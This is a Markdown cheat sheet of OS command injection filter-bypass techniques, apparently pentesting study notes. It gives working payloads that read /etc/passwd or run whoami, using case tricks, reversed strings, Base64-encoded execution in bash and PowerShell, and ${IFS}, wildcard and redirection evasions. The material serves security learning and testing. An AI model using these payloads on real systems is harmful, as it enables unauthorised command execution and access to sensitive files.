
# OS Command Injection - Filter Bypass Techniques

## 🧠 Overview
When security filters block direct command execution (e.g., blocking `cat`, `whoami`, or spaces), we must use obfuscation and alternative execution flows to bypass these restrictions.

---

## 🔤 Case Manipulation
Bypassing filters that rely on case-sensitive keyword matching.

### Windows (Case-Insensitive)
Windows ignores casing in shell commands:

# Bypasses filters looking for 'whoami'
WhOaMi

### Linux (Case-Sensitive)
Since Linux is case-sensitive, we must transform the input dynamically at runtime:

# Runtime transformation
$(tr "[A-Z]" "[a-z]" <<< "WhOaMi")

# Alternative using shell expansion
a="WhOaMi"; printf %s "${a,,}"


---

## 🔄 Command Obfuscation
Techniques to hide keywords or restructure commands when specific strings are blacklisted.

### 1. Reverse Commands (Anti-Keyword)
If `whoami` is blocked, reverse the string:
- **Linux:** `echo 'whoami' | rev` ➡️ `imaohw`
  - Execution: `$(rev <<< 'imaohw')`
- **Windows (PowerShell):** `iex "$('imaohw'[-1..-20] -join '')"`

### 2. Base64 Encoding (The "Gold Standard")
Encoding your payload ensures no forbidden characters or keywords pass through the WAF/Filter.
- **Linux:**
  ```bash
  # Encode
  echo -n 'cat /etc/passwd' | base64
  # Execute
  bash <<< $(base64 -d <<< Y2F0IC9ldGMvcGFzc3dk)
  ```
- **Windows (PowerShell):**
  ```powershell
  # Encode
  [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
  # Execute
  iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
  ```

---

## 🛠️ Evasion Tactics

| Technique | Payload Example | Purpose |
| :--- | :--- | :--- |
| **Spaces** | `cat${IFS}/etc/passwd` | Bypassing space filters. |
| **Wildcards** | `c?t /etc/passw?` | Bypassing string filters. |
| **Tab** | `cat%09/etc/passwd` | Alternative to space. |
| **Variable Expansion** | `ca${a}t /etc/passwd` | Breaking up blacklisted strings. |
| **Input Redirection** | `cat</etc/passwd` | Avoiding `cat` arguments. |

---

## ⚠️ Alternative Binaries
If a specific tool is blocked, search for its functional equivalent:
- `cat` ➡️ `less`, `more`, `head`, `tail`, `nl`, `sed`
- `bash` ➡️ `sh`, `zsh`, `dash`
- `base64` ➡️ `openssl`, `xxd`

---

## 💣 Pentester Mindset
* **Filters block patterns, not logic.** If a pattern is blocked, find another way to express it.
* **Always test multiple layers.** If the request fails, try different encoding levels (URL encode twice, Base64, etc.).
* **Think in terms of "Execution".** Your goal is to get the system to interpret your bytes as a command; the syntax is secondary.

---

## 📚 References
- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)


